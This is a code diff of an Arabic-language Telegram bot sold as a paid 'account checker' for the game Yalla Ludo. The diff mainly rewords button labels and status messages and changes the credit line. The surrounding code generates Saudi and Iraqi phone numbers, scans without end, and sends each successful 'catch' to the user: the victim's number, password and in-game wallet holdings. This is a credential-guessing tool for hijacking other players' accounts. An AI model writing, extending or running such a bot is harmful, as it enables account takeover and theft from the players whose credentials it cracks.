@@ -320,8 +320,6 @@ def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = N
         "<b>New Account Ludo ✅</b>",
         f"📱 <b>Number :</b> <code>{mobile}</code>",
         f"🔑 <b>Pass :</b> <code>{password}</code>",
-        f"🆔 <b>iD :</b> {show_id}",
-        f"👤 <b>Name :</b> {name}",
     ]
     if profile:
         gold, diamond, level, is_vip, royal = _extract_wallet(profile)
@@ -333,7 +331,7 @@ def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = N
         ]
         if royal and royal != 0:
             lines.append(f"🌟 <b>Royal Level:</b> {royal}")
-    lines.append("By - Bot System")
+    lines.append("By - @aboodriad")
     return "\n".join(lines)
 
 def generate_saudi_number() -> str:
@@ -346,23 +344,23 @@ def generate_iraqi_number() -> str:
 
 def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🚀 بدء الفحص التلقائي (لا نهائي)", callback_data="start_scan"))
-    markup.add(InlineKeyboardButton("📊 حالة حسابي / اشتراكي", callback_data="my_sub"))
+    markup.add(InlineKeyboardButton("تشغيل الفحص", callback_data="start_scan"))
+    markup.add(InlineKeyboardButton("نوع اشتراكي", callback_data="my_sub"))
     if user_id == ADMIN_ID:
-        markup.add(InlineKeyboardButton("⚙️ لوحة التحكم بالمطور", callback_data="admin_panel"))
+        markup.add(InlineKeyboardButton("لوحة المطور", callback_data="admin_panel"))
     return markup
 
 def get_scanning_keyboard() -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data="stop_scan"))
+    markup.add(InlineKeyboardButton("ايقاف الفحص", callback_data="stop_scan"))
     return markup
 
 def get_admin_keyboard() -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("➕ تفعيل مستخدم", callback_data="admin_add"))
-    markup.add(InlineKeyboardButton("❌ حذف مستخدم", callback_data="admin_del"))
-    markup.add(InlineKeyboardButton("📋 قائمة المشتركين", callback_data="admin_list"))
-    markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="main_menu"))
+    markup.add(InlineKeyboardButton("تفعيل مستخدم", callback_data="admin_add"))
+    markup.add(InlineKeyboardButton("حذف مستخدم", callback_data="admin_del"))
+    markup.add(InlineKeyboardButton("عدد المشتركين", callback_data="admin_list"))
+    markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
     return markup
 
 #-----------------(الأوامر والواجهات)-----------------#
@@ -375,8 +373,7 @@ def cmd_start(message):
         return
     
     welcome_text = (
-        "<b>مرحباً بك في بوت فحص حسابات يالا لدو المميز 🌟</b>\n\n"
-        "اختر من الأزرار الشفافة أدناه لبدء عملية الفحص أو التحكم بحسابك:"
+        "مرحبا عزيزي في بوت فحص حسابات يلا لودو المدفوع\nنوع الفحص و سيرفرات ( سعودي و عراقي )\nقم بتشغيل الفحص الان 🤍"
     )
     bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))
 
@@ -398,7 +395,7 @@ def handle_callbacks(call):
         if user_id in user_active_scans:
             user_active_scans[user_id]["running"] = False
         try:
-            bot.edit_message_text("<b>القائمة الرئيسية للبوت:</b>", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
+            bot.edit_message_text("مرحبا عزيزي في بوت فحص حسابات يلا لودو المدفوع\nنوع الفحص و سيرفرات ( سعودي و عراقي )\nقم بتشغيل الفحص الان 🤍", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
         except Exception:
             pass
 
@@ -437,10 +434,10 @@ def handle_callbacks(call):
 
         scan_msg = bot.send_message(
             chat_id,
-            "🚀 <b>جاري بدء الفحص التلقائي السريع...</b>\n\n"
-            "🟩 صيد صحيح: 0\n"
-            "🟥 خطأ: 0\n"
-            "⚠️ أخطاء اتصال: 0",
+            "<b>جاري بدء الفحص التلقائي السريع...</b>\n\n"
+            "صيد صحيح: 0\n"
+            "خطأ: 0\n"
+            "أخطاء اتصال: 0",
             reply_markup=get_scanning_keyboard()
         )
 
@@ -460,9 +457,9 @@ def handle_callbacks(call):
         if user_id in user_active_scans:
             user_active_scans[user_id]["running"] = False
         try:
-            bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص.")
+            bot.answer_callback_query(call.id, "تم إيقاف الفحص.")
             bot.edit_message_text(
-                "⏹️ <b>تم إيقاف عملية الفحص الخاصة بك.</b>",
+                "<b>تم إيقاف عملية الفحص الخاصة بك.</b>",
                 chat_id, message_id,
                 reply_markup=get_main_keyboard(user_id)
             )
@@ -536,7 +533,7 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
                     prof = res.get("profile")
                     txt = _tg_text(res["data"], mobile, password, profile=prof)
                     try:
-                        bot.send_message(chat_id, f"🎉 <b>صيد جديد (مستخدم مستقل)!</b>\n\n{txt}")
+                        bot.send_message(chat_id, f"<b>تم صيد حساب جديد</b>\n\n{txt}")
                     except Exception:
                         pass
                 else:
@@ -563,10 +560,10 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
             e = state["error"]
 
             status_text = (
-                f"🚀 <b>جاري فحص الحسابات بشكل سريع ومستقل...</b>\n\n"
-                f"🟩 صيد صحيح: {v}\n"
-                f"🟥 خطأ: {w}\n"
-                f"⚠️ أخطاء اتصال: {e}"
+                f"<b>جاري فحص الحسابات بشكل سريع ومستقل...</b>\n\n"
+                f"صيد صحيح: {v}\n"
+                f"خطأ: {w}\n"
+                f"أخطاء اتصال: {e}"
             )
 
             if status_text != last_update_text:
